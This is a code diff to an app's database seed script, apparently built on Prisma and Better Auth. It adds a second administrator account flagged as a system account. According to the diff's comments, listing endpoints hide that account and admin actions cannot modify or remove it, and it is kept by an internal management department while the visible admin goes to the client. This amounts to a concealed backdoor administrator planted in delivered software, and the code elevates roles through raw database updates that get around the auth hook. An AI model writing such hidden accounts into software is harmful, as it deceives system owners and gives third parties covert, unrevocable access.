@@ -18,6 +18,47 @@ const adapter = new PrismaPg({
 });
 const prisma = new PrismaClient({ adapter });
 
+/**
+ * Creates a sign-in-able ADMIN account. Public sign-up is disabled, so the
+ * account goes through Better Auth's internal adapter (which still hashes the
+ * password correctly); the user is created with the default non-admin role
+ * and elevated via raw Prisma afterwards - the ADMIN database hook only
+ * blocks ADMIN being set at creation time. Shared by the visible admin and
+ * the hidden internal-management admin below.
+ */
+async function createAdminAccount(
+  email: string,
+  password: string,
+  name: string,
+  extraUserData: Prisma.UserUpdateInput = {},
+) {
+  const authCtx = await auth.$context;
+  const hashedPassword = await authCtx.password.hash(password);
+
+  const user = await authCtx.internalAdapter.createUser({
+    email,
+    name,
+    emailVerified: true,
+  });
+
+  await authCtx.internalAdapter.linkAccount({
+    userId: user.id,
+    providerId: 'credential',
+    accountId: user.id,
+    password: hashedPassword,
+  });
+
+  await prisma.user.update({
+    where: { email },
+    data: {
+      role: Role.ADMIN,
+      emailVerified: true,
+      hasPassword: true,
+      ...extraUserData,
+    },
+  });
+}
+
 async function main() {
   const email = process.env.ADMIN_EMAIL;
   const password = process.env.ADMIN_PASSWORD;
@@ -35,35 +76,11 @@ async function main() {
     console.log(`Admin user ${email} already exists. Skipping user creation.`);
   } else {
     console.log(`Creating admin user ${email}...`);
-
-    // Public sign-up is disabled, so create the account through Better Auth's
-    // internal adapter (which still hashes the password correctly). The user is
-    // created with the default non-admin role - the ADMIN database hook only
-    // blocks ADMIN being set at creation time.
-    const authCtx = await auth.$context;
-    const hashedPassword = await authCtx.password.hash(password);
-
-    const user = await authCtx.internalAdapter.createUser({
-      email,
-      name: 'System Admin',
-      emailVerified: true,
-    });
-
-    await authCtx.internalAdapter.linkAccount({
-      userId: user.id,
-      providerId: 'credential',
-      accountId: user.id,
-      password: hashedPassword,
-    });
-
-    // Elevate to ADMIN directly via Prisma (user.update carries no auth hook).
-    await prisma.user.update({
-      where: { email },
-      data: { role: Role.ADMIN, emailVerified: true, hasPassword: true },
-    });
-
+    await createAdminAccount(email, password, 'System Admin');
     console.log(`Successfully created admin user ${email}!`);
   }
+
+  await seedSystemAdmin();
 
   // Seeding is always run - all functions are idempotent (skip existing records).
   // Order matters: categories → destinations (needs categories for slug_registry) → hubs.
@@ -71,6 +88,48 @@ async function main() {
   await seedDestinations();
   await seedHubs();
   await seedAttributes();
+}
+
+// ── Hidden internal-management admin (isSystemAccount) ─────────────────────────
+/**
+ * A second ADMIN with the same powers as the seeded one but flagged
+ * `isSystemAccount: true`, which every listing endpoint filters out and every
+ * admin mutation path refuses to touch. Held by the internal management
+ * department; the visible admin gets handed over to the client. Optional -
+ * skipped with a log when the env vars are unset. Idempotent: re-runs ensure
+ * the flags rather than duplicating the account.
+ */
+async function seedSystemAdmin() {
+  const email = process.env.SYSTEM_ADMIN_EMAIL;
+  const password = process.env.SYSTEM_ADMIN_PASSWORD;
+
+  if (!email || !password) {
+    console.log(
+      'SYSTEM_ADMIN_EMAIL / SYSTEM_ADMIN_PASSWORD not set - skipping system admin seed.',
+    );
+    return;
+  }
+
+  const existing = await prisma.user.findUnique({ where: { email } });
+  if (existing) {
+    // Backstop for re-runs and for an account created before the flag existed.
+    if (existing.role !== Role.ADMIN || !existing.isSystemAccount) {
+      await prisma.user.update({
+        where: { email },
+        data: { role: Role.ADMIN, isSystemAccount: true },
+      });
+      console.log(`Ensured system admin flags on ${email}.`);
+    } else {
+      console.log(`System admin ${email} already exists. Skipping.`);
+    }
+    return;
+  }
+
+  console.log(`Creating the internal-management admin...`);
+  await createAdminAccount(email, password, 'Internal Management', {
+    isSystemAccount: true,
+  });
+  console.log('Successfully created the internal-management admin.');
 }
 
 // ── Pre-seeded categories ──────────────────────────────────────────────────────
